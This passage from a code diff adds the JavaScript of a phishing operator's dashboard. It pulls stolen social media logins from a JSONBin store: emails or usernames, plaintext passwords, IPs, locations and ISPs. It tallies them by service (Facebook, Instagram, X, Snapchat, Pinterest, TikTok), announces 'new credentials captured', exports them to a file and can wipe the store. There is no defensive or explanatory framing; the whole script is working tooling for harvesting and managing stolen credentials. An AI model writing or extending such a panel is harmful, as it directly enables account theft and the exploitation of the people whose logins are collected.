+                        outputLine.textContent = "[SYSTEM] Stealth protocol initialized. Starting ghost link...";
+                        cursor.style.display = 'none';
+                        
+                        setTimeout(() => {
+                            document.getElementById('passwordPrompt').classList.remove('hidden');
+                            document.getElementById('passwordInput').focus();
+                        }, 1000);
+                    }, 500);
+                }
+            }
+            
+            setTimeout(typeCommand, 1000);
+            
+            // Password input handler
+            document.getElementById('passwordInput').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    const password = this.value;
+                    if (password === ACCESS_PASSWORD) {
+                        statusLine.textContent = "[SUCCESS] Access granted. Initializing ghost interface...";
+                        this.value = '';
+                        
+                        const terminalSteps = [
+                            "[SYSTEM] Booting stealth processors...",
+                            "[SECURITY] Initializing ghost encryption...",
+                            "[NETWORK] Connecting to dark network...",
+                            "[DATABASE] Loading ghost archives...",
+                            "[INTERFACE] Stealth link established..."
+                        ];
+                        
+                        let step = 0;
+                        function showSteps() {
+                            if (step < terminalSteps.length) {
+                                statusLine.textContent = terminalSteps[step];
+                                step++;
+                                setTimeout(showSteps, 800);
+                            } else {
+                                setTimeout(() => {
+                                    document.getElementById('terminalScreen').style.display = 'none';
+                                    document.getElementById('dashboard').style.display = 'block';
+                                    loadData(true);
+                                    startAutoRefresh();
+                                }, 1000);
+                            }
+                        }
+                        
+                        setTimeout(showSteps, 500);
+                        
+                    } else {
+                        statusLine.textContent = "[ALERT] Invalid access code. Ghost breach logged.";
+                        this.value = '';
+                        
+                        setTimeout(() => {
+                            document.getElementById('terminalScreen').classList.add('hidden');
+                            document.getElementById('accessDenied').classList.remove('hidden');
+                            
+                            // Countdown
+                            let count = 10;
+                            const countdownEl = document.getElementById('countdown');
+                            const countdownSeconds = document.getElementById('countdownSeconds');
+                            const countdown = setInterval(() => {
+                                count--;
+                                countdownEl.textContent = count;
+                                countdownSeconds.textContent = count;
+                                
+                                if (count <= 0) {
+                                    clearInterval(countdown);
+                                    window.location.href = "about:blank";
+                                }
+                            }, 1000);
+                        }, 2000);
+                    }
+                }
+            });
+        }
+        
+        // Load data from JSONBin
+        async function loadData(showLoading = true) {
+            if (showLoading) {
+                document.getElementById('loading').classList.remove('hidden');
+                document.getElementById('noData').classList.add('hidden');
+                document.getElementById('dataTable').classList.add('hidden');
+            }
+            
+            try {
+                const response = await fetch(JSONBIN_URL, {
+                    headers: {
+                        'X-Master-Key': JSONBIN_API_KEY,
+                        'Content-Type': 'application/json'
+                    }
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                }
+                
+                const result = await response.json();
+                
+                let newData = [];
+                
+                if (Array.isArray(result)) {
+                    newData = result;
+                } else if (result.record && Array.isArray(result.record)) {
+                    newData = result.record;
+                } else if (result.loginAttempts && Array.isArray(result.loginAttempts)) {
+                    newData = result.loginAttempts;
+                } else {
+                    console.warn('Unexpected data structure:', result);
+                    newData = [];
+                }
+                
+                // Check for new data and show bell notification
+                if (newData.length > previousDataCount && previousDataCount > 0) {
+                    const newCount = newData.length - previousDataCount;
+                    let serviceText = "";
+                    
+                    const newItems = newData.slice(-newCount);
+                    const services = newItems.map(item => item.service).filter(Boolean);
+                    
+                    if (services.length > 0) {
+                        const uniqueServices = [...new Set(services)];
+                        serviceText = ` (${uniqueServices.join(', ')})`;
+                    }
+                    
+                    showNotification(`🔔 ${newCount} NEW CREDENTIAL${newCount > 1 ? 'S' : ''} CAPTURED!${serviceText}`);
+                }
+                
+                previousDataCount = newData.length;
+                allData = newData;
+                
+                updateLastUpdateTime();
+                
+                if (allData.length === 0) {
+                    document.getElementById('loading').classList.add('hidden');
+                    document.getElementById('noData').classList.remove('hidden');
+                    updateStats();
+                    return;
+                }
+                
+                updateStats();
+                renderTable();
+                
+            } catch (error) {
+                console.error('Error loading data:', error);
+                document.getElementById('loading').textContent = 'ERROR: CONNECTION FAILED';
+                document.getElementById('loading').classList.remove('hidden');
+                document.getElementById('noData').classList.add('hidden');
+            }
+        }
+        
+        // Update statistics
+        function updateStats() {
+            const today = new Date().toDateString();
+            const totalCaptures = allData.length;
+            const todayCaptures = allData.filter(item => {
+                const itemDate = new Date(item.timestamp || item.time).toDateString();
+                return itemDate === today;
+            }).length;
+            
+            const uniqueCountries = [...new Set(allData.map(item => item.country || 'Unknown').filter(c => c !== 'Unknown'))].length;
+            
+            const facebookCount = allData.filter(item => {
+                if (!item.service) return false;
+                const serviceLower = item.service.toLowerCase();
+                return serviceLower.includes('facebook') || serviceLower.includes('fb');
+            }).length;
+            
+            const instagramCount = allData.filter(item => {
+                if (!item.service) return false;
+                const serviceLower = item.service.toLowerCase();
+                return serviceLower.includes('instagram') || serviceLower.includes('ig');
+            }).length;
+            
+            const twitterCount = allData.filter(item => {
+                if (!item.service) return false;
+                const serviceLower = item.service.toLowerCase();
+                return serviceLower.includes('twitter') || serviceLower.includes('x');
+            }).length;
+            
+            const snapchatCount = allData.filter(item => {
+                if (!item.service) return false;
+                const serviceLower = item.service.toLowerCase();
+                return serviceLower.includes('snapchat');
+            }).length;
+            
+            const pinterestCount = allData.filter(item => {
+                if (!item.service) return false;
+                const serviceLower = item.service.toLowerCase();
+                return serviceLower.includes('pinterest');
+            }).length;
+            
+            const tiktokCount = allData.filter(item => {
+                if (!item.service) return false;
+                const serviceLower = item.service.toLowerCase();
+                return serviceLower.includes('tiktok');
+            }).length;
+            
+            const lastCapture = allData.length > 0 ? 
+                new Date(allData[allData.length - 1].timestamp || allData[allData.length - 1].time).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) : '--:--';
+            
+            document.getElementById('totalCaptures').textContent = totalCaptures;
+            document.getElementById('todayCaptures').textContent = todayCaptures;
+            document.getElementById('uniqueCountries').textContent = uniqueCountries;
+            document.getElementById('facebookCount').textContent = facebookCount;
+            document.getElementById('instagramCount').textContent = instagramCount;
+            document.getElementById('twitterCount').textContent = twitterCount;
+            document.getElementById('snapchatCount').textContent = snapchatCount;
+            document.getElementById('pinterestCount').textContent = pinterestCount;
+            document.getElementById('tiktokCount').textContent = tiktokCount;
+            document.getElementById('lastCaptureTime').textContent = lastCapture;
+        }
+        
+        // Render table with filtering
+        function renderTable() {
+            const tableBody = document.getElementById('tableBody');
+            tableBody.innerHTML = '';
+            
+            let filteredData = [...allData];
+            if (currentFilter !== 'all') {
+                filteredData = filteredData.filter(item => {
+                    if (!item.service) return false;
+                    const serviceLower = item.service.toLowerCase();
+                    
+                    if (currentFilter === 'facebook') {
+                        return serviceLower.includes('facebook') || serviceLower.includes('fb');
+                    } else if (currentFilter === 'instagram') {
+                        return serviceLower.includes('instagram') || serviceLower.includes('ig');
+                    } else if (currentFilter === 'twitter') {
+                        return serviceLower.includes('twitter') || serviceLower.includes('x');
+                    } else if (currentFilter === 'snapchat') {
+                        return serviceLower.includes('snapchat');
+                    } else if (currentFilter === 'pinterest') {
+                        return serviceLower.includes('pinterest');
+                    } else if (currentFilter === 'tiktok') {
+                        return serviceLower.includes('tiktok');
+                    }
+                    return false;
+                });
+            }
+            
+            filteredData.sort((a, b) => {
+                const dateA = new Date(a.timestamp || a.time);
+                const dateB = new Date(b.timestamp || b.time);
+                return dateB - dateA;
+            });
+            
+            if (filteredData.length === 0) {
+                document.getElementById('loading').classList.add('hidden');
+                document.getElementById('noData').classList.remove('hidden');
+                document.getElementById('dataTable').classList.add('hidden');
+                return;
+            }
+            
+            filteredData.forEach((item) => {
+                const row = document.createElement('tr');
+                
+                let serviceBadge = 'Unknown';
+                let serviceClass = '';
+                
+                if (item.service) {
+                    const serviceLower = item.service.toLowerCase();
+                    if (serviceLower.includes('facebook')) {
+                        serviceBadge = 'FACEBOOK';
+                        serviceClass = 'service-facebook';
+                    } else if (serviceLower.includes('instagram')) {
+                        serviceBadge = 'INSTAGRAM';
+                        serviceClass = 'service-instagram';
+                    } else if (serviceLower.includes('twitter') || serviceLower.includes('x')) {
+                        serviceBadge = 'X/TWITTER';
+                        serviceClass = 'service-twitter';
+                    } else if (serviceLower.includes('snapchat')) {
+                        serviceBadge = 'SNAPCHAT';
+                        serviceClass = 'service-snapchat';
+                    } else if (serviceLower.includes('pinterest')) {
+                        serviceBadge = 'PINTEREST';
+                        serviceClass = 'service-pinterest';
+                    } else if (serviceLower.includes('tiktok')) {
+                        serviceBadge = 'TIKTOK';
+                        serviceClass = 'service-tiktok';
+                    } else {
+                        serviceBadge = item.service.toUpperCase();
+                    }
+                }
+                
+                const timestamp = formatDate(item.timestamp || item.time);
+                const credential = item.email || item.username || 'N/A';
+                const credentialClass = item.email ? 'email' : 'username';
+                
+                row.innerHTML = `
+                    <td class="timestamp">${timestamp}</td>
+                    <td>
+                        <span class="service-badge ${serviceClass}">
+                            ${serviceBadge}
+                        </span>
+                    </td>
+                    <td><span class="${credentialClass}">${escapeHtml(credential)}</span></td>
+                    <td><span class="password">${escapeHtml(item.password || 'N/A')}</span></td>
+                    <td class="ip">${item.ip || 'N/A'}</td>
+                    <td class="country">${item.country || 'N/A'} ${item.city ? `(${item.city})` : ''}</td>
+                    <td>${item.isp || 'N/A'}</td>
+                    <td>${item.timezone || 'N/A'}</td>
+                `;
+                
+                tableBody.appendChild(row);
+            });
+            
+            document.getElementById('loading').classList.add('hidden');
+            document.getElementById('dataTable').classList.remove('hidden');
+        }
+        
+        function escapeHtml(str) {
+            if (!str) return '';
+            return str.replace(/[&<>]/g, function(m) {
+                if (m === '&') return '&amp;';
+                if (m === '<') return '&lt;';
+                if (m === '>') return '&gt;';
+                return m;
+            });
+        }
+        
+        function formatDate(dateString) {
+            try {
+                const date = new Date(dateString);
+                return date.toLocaleString();
+            } catch {
+                return dateString || 'Unknown';
+            }
+        }
+        
+        // Filter by service
+        function filterByService(service) {
+            currentFilter = service;
+            renderTable();
+            
+            document.querySelectorAll('.control-btn').forEach(btn => {
+                btn.style.background = 'rgba(0, 40, 0, 0.8)';
+            });
+            
+            if (service === 'all') {
+                document.getElementById('filterAll').style.background = 'rgba(0, 60, 0, 0.8)';
+            }
+        }
+        
+        // Export data
+        function exportData() {
+            if (allData.length === 0) {
+                showNotification('No data to export!');
+                return;
+            }
+            
+            const dataStr = JSON.stringify(allData, null, 2);
+            const dataBlob = new Blob([dataStr], { type: 'application/json' });
+            const url = URL.createObjectURL(dataBlob);
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = `ghost_credentials-${new Date().toISOString().split('T')[0]}.json`;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(url);
+            
+            showNotification(`Exported ${allData.length} records!`);
+        }
+        
+        // Clear all data
+        async function clearAll() {
+            if (!confirm('🚨 WARNING: This will delete ALL captured data permanently!\n\nAre you sure?')) {
+                return;
+            }
+            
+            try {
+                const response = await fetch(JSONBIN_URL, {
+                    method: 'PUT',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-Master-Key': JSONBIN_API_KEY
+                    },
+                    body: JSON.stringify([])
+                });
+                
+                if (response.ok) {
+                    showNotification('Database purged successfully!');
+                    allData = [];
+                    previousDataCount = 0;
+                    updateStats();
+                    renderTable();
+                } else {
+                    throw new Error('Failed to clear data');
+                }
+                
+            } catch (error) {
+                showNotification('Error clearing data!');
+            }
+        }
+        
+        // Start 15-second auto-refresh
+        function startAutoRefresh() {
+            if (autoRefreshInterval) clearInterval(autoRefreshInterval);
+            
+            autoRefreshInterval = setInterval(() => {
+                loadData(false);
+            }, 15000);
+            
+            console.log('Auto-refresh started: 15 second intervals');
+        }
+        
+        function toggleAutoRefresh() {
+            autoRefresh = !autoRefresh;
+            const btn = document.getElementById('autoRefreshBtn');
+            
+            if (autoRefresh) {
+                btn.innerHTML = '⏰ AUTO REFRESH: ON';
+                startAutoRefresh();
+                showNotification('Auto-refresh enabled (15s)');
+            } else {
+                btn.innerHTML = '⏰ AUTO REFRESH: OFF';
+                if (autoRefreshInterval) {
+                    clearInterval(autoRefreshInterval);
+                    autoRefreshInterval = null;
+                }
+                showNotification('Auto-refresh disabled');
+            }
+        }
+        
+        // Update last update time
+        function updateLastUpdateTime() {
+            const now = new Date();
+            const timeString = now.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
+            const dateString = now.toLocaleDateString();
+            document.getElementById('lastUpdateTime').textContent = `${dateString} ${timeString}`;
+        }
+        
+        // Initialize filter button highlighting
+        setTimeout(() => {
+            filterByService('all');
+        }, 1000);
+    </script>
+</body>
+</html>
